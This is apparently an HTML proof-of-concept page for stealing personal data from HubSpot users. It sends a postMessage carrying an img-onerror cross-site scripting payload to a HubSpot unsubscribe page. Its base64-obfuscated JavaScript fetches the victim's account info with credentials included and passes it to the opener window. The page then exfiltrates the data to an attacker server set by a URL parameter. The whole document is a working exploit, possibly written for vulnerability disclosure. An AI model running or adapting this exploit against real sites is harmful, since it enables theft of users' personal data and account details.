<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Hupspot stealing PII POC</title>
  </head>
  <body>
    <script>
      let win = window.open(
        "https://hs-6069836.s.hubspotemail.net/hs/manage-preferences/unsubscribe-all"
      );
      setTimeout(() => {
        poc(win);
      }, 5000);

      function poc(win) {
        let fetchPII = `<img src=x onerror="eval(atob('dmFyIFBJSTsNCi8vIGZldGNoaW5nIHZpY3RpbSB1c2VyIFBJSSBpbmZvDQpmZXRjaCgiaHR0cHM6Ly9hcHAtZXUxLmh1YnNwb3QuY29tL2FwaS9sb2dpbi12ZXJpZnkvdXNlci1pbmZvIiwgew0KICBtZXRob2Q6ICJnZXQiLA0KICBjcmVkZW50aWFsczogImluY2x1ZGUiLA0KICBoZWFkZXJzOiB7ICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIgfSwNCn0pDQogIC50aGVuKChyZXNwb25zZSkgPT4gcmVzcG9uc2UuanNvbigpKQ0KICAudGhlbigoeCkgPT4gew0KICAgIFBJSSA9IEpTT04uc3RyaW5naWZ5KHgpOw0KICAgIHdpbmRvdy5vcGVuZXIucG9zdE1lc3NhZ2UoUElJLCAiKiIpOyAvLyBzZW5kIHZpY3RpbSB1c2VyIFBJSSBpbmZvIHRvIHBhcmVudCB3aW5kb3cNCiAgICANCiAgfSk7DQo='))" >`;

        msg = {
          type: "hsFormCallback",
          id: fetchPII,
        };
        win.postMessage(msg, "*");
      }

      window.addEventListener("message", function (msg) {
        // when recive user PII info send it to attacker server

        let ATTACKER_SERVER = new URLSearchParams(location.search).get("url");

        new Image().src =
          ATTACKER_SERVER +
          "?victimPII=" + // add here your controlable server to send victim PII info to it
          msg.data;
      });
    </script>
  </body>
</html>
